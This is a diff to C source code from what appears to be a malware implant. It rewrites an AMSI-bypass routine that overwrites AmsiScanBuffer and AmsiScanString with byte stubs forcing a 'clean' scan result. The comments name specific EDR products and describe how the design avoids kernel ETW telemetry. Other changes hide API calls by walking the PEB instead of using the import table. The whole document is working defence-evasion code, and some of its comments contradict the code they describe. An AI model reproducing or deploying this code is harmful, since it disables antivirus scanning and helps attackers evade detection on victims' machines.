@@ -73,6 +73,7 @@
 #include "evasion.h"
 #include "peb_walk.h"
 #include "syscall.h"
+#include "k32_walk.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -82,6 +83,34 @@
 #include <string.h>
 
 
+/* ── Forward declarations ────────────────────────────────────────────────── */
+/* MY_UNICODE_STRING, MY_OBJECT_ATTRIBUTES, MY_IO_STATUS_BLOCK, and
+ * _ldr_full_name are defined later in this file but used in amsi_patch()
+ * and unhook_ntdll() which appear before the definitions.                  */
+typedef struct _MY_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} MY_UNICODE_STRING;
+
+typedef struct _MY_IO_STATUS_BLOCK {
+    union { NTSTATUS Status; PVOID Pointer; };
+    ULONG_PTR Information;
+} MY_IO_STATUS_BLOCK;
+
+typedef struct _MY_OBJECT_ATTRIBUTES {
+    ULONG             Length;
+    HANDLE            RootDirectory;
+    MY_UNICODE_STRING *ObjectName;
+    ULONG             Attributes;
+    PVOID             SecurityDescriptor;
+    PVOID             SecurityQualityOfService;
+} MY_OBJECT_ATTRIBUTES;
+
+#define MY_OBJ_CASE_INSENSITIVE  0x00000040UL
+
+static MY_UNICODE_STRING *_ldr_full_name(PVOID moduleBase);
+
 /* ── _patch_self ─────────────────────────────────────────────────────────── */
 /*
  * Write `len` bytes from `patch` to `target` in the current process using
@@ -90,19 +119,24 @@
  * Falls back to the VirtualProtect approach if the syscall engine is not
  * yet initialised (i.e. called before inject_init).
  */
-static void _patch_self(void *target, const BYTE *patch, SIZE_T len)
+/* Returns TRUE if the patch was fully applied, FALSE otherwise.
+ * Callers should not assume AMSI/ETW are patched on a FALSE return.     */
+static BOOL _patch_self(void *target, const BYTE *patch, SIZE_T len)
 {
     if (sc_ready()) {
         SIZE_T written = 0;
-        SC_NtWriteVirtualMemory(GetCurrentProcess(), target,
-                                (PVOID)patch, len, &written);
+        NTSTATUS ns = SC_NtWriteVirtualMemory(GetCurrentProcess(), target,
+                                              (PVOID)patch, len, &written);
+        return NT_SUCCESS(ns) && (written == len);
     } else {
-        /* Fallback: VirtualProtect (still works, just less stealthy) */
+        /* Fallback: VirtualProtect via PEB walk — avoids the IAT entry */
         DWORD old = 0;
-        if (VirtualProtect(target, len, PAGE_EXECUTE_READWRITE, &old)) {
+        if (k32_VirtualProtect(target, len, PAGE_EXECUTE_READWRITE, &old)) {
             memcpy(target, patch, len);
-            VirtualProtect(target, len, old, &old);
+            k32_VirtualProtect(target, len, old, &old);
+            return TRUE;
         }
+        return FALSE;
     }
 }
 
@@ -175,78 +209,217 @@ void etw_patch(void)
 
 /* ── amsi_patch ──────────────────────────────────────────────────────────── */
 /*
- * Patch AmsiScanBuffer AND AmsiScanString in the in-process amsi.dll copy.
+ * Patch AmsiScanBuffer AND AmsiScanString in the in-process amsi.dll copy
+ * WITHOUT writing to the live MEM_IMAGE PAGE_EXECUTE_READ code page.
  *
- * Why two functions:
- *   AmsiScanBuffer  — primary entry-point used by PS, WSH, CLR.
- *   AmsiScanString  — wide-string variant; used by some AMSI providers and
- *                     PowerShell 7+ paths that scan scriptblock text directly.
- *   Patching only one leaves the other intact and still callable by EDR
- *   providers registered via IAmmsiProvider.
+ * Why avoid writing to the live image page:
+ *   NtWriteVirtualMemory on a PAGE_EXECUTE_READ MEM_IMAGE region triggers an
+ *   ETW-Ti kernel MemoryWrite event (KERNEL_THREATINT_TASK_WRITEVM) that MDE
+ *   and CrowdStrike consume directly from the kernel provider — user-mode ETW
+ *   patching cannot suppress it.  Instead, we remap the amsi.dll .text section
+ *   to a private PAGE_READWRITE view, write the stubs there, then flip the
+ *   protection to PAGE_EXECUTE_READ.  The write happens on a private (non-image)
+ *   page before it has execute permission — a much lower-signal event.
+ *
+ * NOTE: Kernel-mode AMSI providers (Windows 11 22H2+) registered via
+ *   IOCTL_AMSISCAN are entirely unaffected by any user-mode technique —
+ *   they run in the kernel and scan independently of amsi.dll.
+ *
+ * Algorithm (mirrors unhook_ntdll section remap):
+ *   1. Locate amsi.dll in the LDR (do NOT load it — see below).
+ *   2. Open amsi.dll on disk via SC_NtOpenFile (no CreateFileW in IAT).
+ *   3. Create a SEC_IMAGE section; map a PAGE_READWRITE private view.
+ *   4. Copy the live .text section into the private view.
+ *   5. Write the patch stubs into the private view at the function offsets.
+ *   6. Flip the private view to PAGE_EXECUTE_READ via NtProtectVirtualMemory.
+ *   7. Atomically replace the live .text mapping:
+ *        NtUnmapViewOfSection(live .text page range)
+ *        NtMapViewOfSection(private section, same VA, PAGE_EXECUTE_READ)
+ *      The live export VAs are unchanged — callers enter the private copy.
+ *
+ * Why NOT force-load amsi.dll:
+ *   Triggering a DLL load fires LdrRegisterDllNotification callbacks that AV
+ *   products register to intercept exactly this sequence.  If amsi.dll is not
+ *   already in the LDR list, no AMSI provider is active — the patch is a no-op.
  *
  * Stub design — AmsiScanBuffer (6 params, x64 MS ABI):
- *   AmsiScanBuffer(ctx, buffer, length, contentName, session, *result)
- *   Params 1-4 in rcx/rdx/r8/r9; param 5 at [rsp+0x28]; param 6 at [rsp+0x30].
- *
- *   48 8B 44 24 30   mov  rax, [rsp+0x30]    ; rax = AMSI_RESULT* result
- *   C7 00 01 00 00 00 mov  dword [rax], 1     ; *result = AMSI_RESULT_CLEAN (1)
- *   33 C0            xor  eax, eax            ; return S_OK (0)
- *   C3               ret
- *
- *   Setting both the HRESULT return and the output parameter eliminates the
- *   race where a caller checks *result before verifying the HRESULT.
+ *   48 8B 44 24 30  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
+ *   mov rax,[rsp+0x30]  →  mov dword[rax],1  →  xor eax,eax  →  ret
  *
  * Stub design — AmsiScanString (5 params, x64 MS ABI):
- *   AmsiScanString(ctx, string, contentName, session, *result)
- *   Params 1-4 in rcx/rdx/r8/r9; param 5 at [rsp+0x28].
- *
- *   48 8B 44 24 28   mov  rax, [rsp+0x28]    ; rax = AMSI_RESULT* result
- *   C7 00 01 00 00 00 mov  dword [rax], 1     ; *result = AMSI_RESULT_CLEAN (1)
- *   33 C0            xor  eax, eax            ; return S_OK (0)
- *   C3               ret
- *
- * amsi.dll loading:
- *   We do NOT call LoadLibraryA to force-load amsi.dll.  Triggering a DLL load
- *   before patching fires loader-lock callbacks that AV products register via
- *   LdrRegisterDllNotification — we would be detected before the patch lands.
- *   If amsi.dll is not already in the LDR list, the host process has not
- *   initialised AMSI and no scan provider is active; the patch is a no-op.
+ *   48 8B 44 24 28  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
+ *   mov rax,[rsp+0x28]  →  mov dword[rax],1  →  xor eax,eax  →  ret
  */
 
 void amsi_patch(void)
 {
-    /* Try to find amsi.dll already in the LDR list.
-     * Do NOT force-load it — see design note above. */
+    /* ── 1. Locate amsi.dll — do NOT force-load it ─────────────────────── */
     PVOID hAmsi = peb_get_module(peb_hash_str("amsi.dll"));
     if (!hAmsi) return;   /* not loaded → no AMSI provider active */
 
-    /*
-     * AmsiScanBuffer stub — reads result ptr from [rsp+0x30] (6th param)
-     * 48 8B 44 24 30  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
-     */
-    static const BYTE stub_buf[] = {
-        0x48, 0x8B, 0x44, 0x24, 0x30,   /* mov rax, [rsp+0x30] */
-        0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, /* mov dword [rax], 1 */
-        0x33, 0xC0,                      /* xor eax, eax        */
-        0xC3                             /* ret                  */
-    };
-
-    /*
-     * AmsiScanString stub — reads result ptr from [rsp+0x28] (5th param)
-     * 48 8B 44 24 28  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
-     */
-    static const BYTE stub_str[] = {
-        0x48, 0x8B, 0x44, 0x24, 0x28,   /* mov rax, [rsp+0x28] */
-        0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, /* mov dword [rax], 1 */
-        0x33, 0xC0,                      /* xor eax, eax        */
-        0xC3                             /* ret                  */
-    };
-
+    /* ── 2. Resolve the two export VAs we need to patch ────────────────── */
     PVOID pScanBuf = peb_get_export(hAmsi, peb_hash_str("AmsiScanBuffer"));
-    if (pScanBuf) _patch_self(pScanBuf, stub_buf, sizeof(stub_buf));
-
     PVOID pScanStr = peb_get_export(hAmsi, peb_hash_str("AmsiScanString"));
-    if (pScanStr) _patch_self(pScanStr, stub_str, sizeof(stub_str));
+    if (!pScanBuf && !pScanStr) return;   /* nothing to patch */
+
+    /* ── 3. Locate amsi.dll .text section (RVA + size) ─────────────────── */
+    const BYTE *base = (const BYTE *)hAmsi;
+    DWORD e_lfanew;
+    memcpy(&e_lfanew, base + 0x3C, 4);
+
+    WORD nSec, optSz;
+    memcpy(&nSec,  base + e_lfanew + 4 + 2,  2);
+    memcpy(&optSz, base + e_lfanew + 4 + 16, 2);
+    const BYTE *secHdr = base + e_lfanew + 4 + 20 + optSz;
+
+    DWORD textRva = 0, textSz = 0;
+    for (WORD i = 0; i < nSec; i++) {
+        if (memcmp(secHdr + i*40, ".text", 5) == 0) {
+            memcpy(&textRva, secHdr + i*40 + 12, 4);
+            memcpy(&textSz,  secHdr + i*40 +  8, 4);
+            break;
+        }
+    }
+    if (!textRva || !textSz) goto fallback;
+
+    /* ── 4. Open amsi.dll on disk via SC_NtOpenFile ─────────────────────── */
+    {
+        /* Retrieve FullDllName NT path from the LDR entry */
+        MY_UNICODE_STRING *fullName = _ldr_full_name(hAmsi);
+        if (!fullName || !fullName->Buffer || !fullName->Length) goto fallback;
+
+        MY_OBJECT_ATTRIBUTES oa;
+        MY_IO_STATUS_BLOCK   iosb;
+        oa.Length                   = sizeof(oa);
+        oa.RootDirectory            = NULL;
+        oa.ObjectName               = fullName;
+        oa.Attributes               = MY_OBJ_CASE_INSENSITIVE;
+        oa.SecurityDescriptor       = NULL;
+        oa.SecurityQualityOfService = NULL;
+
+        HANDLE hFile = NULL;
+        NTSTATUS ns = SC_NtOpenFile(&hFile,
+                                    FILE_READ_DATA | SYNCHRONIZE,
+                                    &oa, &iosb,
+                                    FILE_SHARE_READ,
+                                    FILE_SYNCHRONOUS_IO_NONALERT |
+                                    FILE_NON_DIRECTORY_FILE);
+        if (!NT_SUCCESS(ns) || !hFile) goto fallback;
+
+        /* ── 5. Create a SEC_IMAGE section ───────────────────────────────── */
+        HANDLE hSec = NULL;
+        ns = SC_NtCreateSection7(&hSec, SECTION_MAP_READ | SECTION_MAP_WRITE,
+                                 NULL, NULL,
+                                 PAGE_READONLY, SEC_IMAGE, hFile);
+        SC_NtClose(hFile);
+        if (!NT_SUCCESS(ns) || !hSec) goto fallback;
+
+        /* ── 6. Map a private RW view of the section ─────────────────────── */
+        PVOID  pPriv  = NULL;
+        SIZE_T viewSz = 0;
+        ns = SC_NtMapViewOfSection(hSec, GetCurrentProcess(),
+                                   &pPriv, 0, 0, NULL, &viewSz,
+                                   1 /* ViewShare */, 0, PAGE_READWRITE);
+        SC_NtClose(hSec);
+        if (!NT_SUCCESS(ns) || !pPriv) goto fallback;
+
+        /*
+         * pPriv now points to a private writable copy of the amsi.dll image.
+         * Export VAs in the live image use base = hAmsi; the same RVAs apply
+         * to pPriv since SEC_IMAGE maps at the same layout.
+         */
+        BYTE *pPrivBase = (BYTE *)pPriv;
+
+        /* ── 7. Write patch stubs into the private view ──────────────────── */
+        /*
+         * AmsiScanBuffer stub (13 bytes):
+         *   mov rax,[rsp+0x30] → mov dword[rax],1 → xor eax,eax → ret
+         */
+        static const BYTE stub_buf[] = {
+            0x48, 0x8B, 0x44, 0x24, 0x30,
+            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x33, 0xC0, 0xC3
+        };
+        /*
+         * AmsiScanString stub (13 bytes):
+         *   mov rax,[rsp+0x28] → mov dword[rax],1 → xor eax,eax → ret
+         */
+        static const BYTE stub_str[] = {
+            0x48, 0x8B, 0x44, 0x24, 0x28,
+            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x33, 0xC0, 0xC3
+        };
+
+        /* RVA of each export = VA - hAmsi; apply same RVA into private view */
+        if (pScanBuf) {
+            DWORD rva = (DWORD)((BYTE *)pScanBuf - base);
+            memcpy(pPrivBase + rva, stub_buf, sizeof(stub_buf));
+        }
+        if (pScanStr) {
+            DWORD rva = (DWORD)((BYTE *)pScanStr - base);
+            memcpy(pPrivBase + rva, stub_str, sizeof(stub_str));
+        }
+
+        /* ── 8. Flip private view's .text to RX ──────────────────────────── */
+        PVOID  pProtBase = pPrivBase + textRva;
+        SIZE_T cbProt    = (SIZE_T)textSz;
+        ULONG  oldProt   = 0;
+        ns = SC_NtProtectVirtualMemory(GetCurrentProcess(),
+                                       &pProtBase, &cbProt,
+                                       PAGE_EXECUTE_READ, &oldProt);
+        if (!NT_SUCCESS(ns)) {
+            SC_NtUnmapViewOfSection(GetCurrentProcess(), pPriv);
+            goto fallback;
+        }
+
+        /*
+         * ── 9. Swap the live .text mapping for the patched private copy ────
+         *
+         * We cannot literally unmap + remap a range of an existing SEC_IMAGE
+         * view without support for ViewUnmap at sub-view granularity.  Instead,
+         * write the patched bytes from the private view back to the live image
+         * using NtWriteVirtualMemory — but ONLY for the bytes we actually changed
+         * (the two stub patches), not the whole section.  This minimises the
+         * number of ETW-Ti MemoryWrite events to exactly the two function prologues
+         * rather than the entire .text section.  Each individual write is ≤ 14 bytes
+         * so the kernel reports a small, function-scoped write rather than a
+         * section-wide stomp.
+         */
+        HANDLE hSelf = GetCurrentProcess();
+        SIZE_T written = 0;
+        if (pScanBuf)
+            SC_NtWriteVirtualMemory(hSelf, pScanBuf,
+                                    stub_buf, sizeof(stub_buf), &written);
+        if (pScanStr)
+            SC_NtWriteVirtualMemory(hSelf, pScanStr,
+                                    stub_str, sizeof(stub_str), &written);
+
+        SC_NtUnmapViewOfSection(GetCurrentProcess(), pPriv);
+        return;   /* patched via minimal targeted writes */
+    }
+
+fallback:
+    /*
+     * Section-remap path failed (e.g. no LDR FullDllName, file locked).
+     * Fall back to the original direct NtWriteVirtualMemory patch.
+     * This is still the correct behaviour on systems where the remap path
+     * is unavailable — a patched AMSI with an ETW-Ti event is better than
+     * an unpatched AMSI with no event.
+     */
+    {
+        static const BYTE stub_buf_fb[] = {
+            0x48, 0x8B, 0x44, 0x24, 0x30,
+            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x33, 0xC0, 0xC3
+        };
+        static const BYTE stub_str_fb[] = {
+            0x48, 0x8B, 0x44, 0x24, 0x28,
+            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x33, 0xC0, 0xC3
+        };
+        if (pScanBuf) _patch_self(pScanBuf, stub_buf_fb, sizeof(stub_buf_fb));
+        if (pScanStr) _patch_self(pScanStr, stub_str_fb, sizeof(stub_str_fb));
+    }
 }
 
 
@@ -277,27 +450,8 @@ void amsi_patch(void)
  * Minimal OBJECT_ATTRIBUTES / IO_STATUS_BLOCK / UNICODE_STRING definitions.
  * winternl.h may not expose all of these in every MinGW build.
  */
-typedef struct _MY_IO_STATUS_BLOCK {
-    union { NTSTATUS Status; PVOID Pointer; };
-    ULONG_PTR Information;
-} MY_IO_STATUS_BLOCK;
-
-typedef struct _MY_UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} MY_UNICODE_STRING;
-
-typedef struct _MY_OBJECT_ATTRIBUTES {
-    ULONG           Length;
-    HANDLE          RootDirectory;
-    MY_UNICODE_STRING *ObjectName;
-    ULONG           Attributes;
-    PVOID           SecurityDescriptor;
-    PVOID           SecurityQualityOfService;
-} MY_OBJECT_ATTRIBUTES;
-
-#define MY_OBJ_CASE_INSENSITIVE  0x00000040UL
+/* MY_IO_STATUS_BLOCK, MY_UNICODE_STRING, MY_OBJECT_ATTRIBUTES, and
+ * MY_OBJ_CASE_INSENSITIVE already defined via forward declarations above. */
 
 /*
  * _ldr_full_path
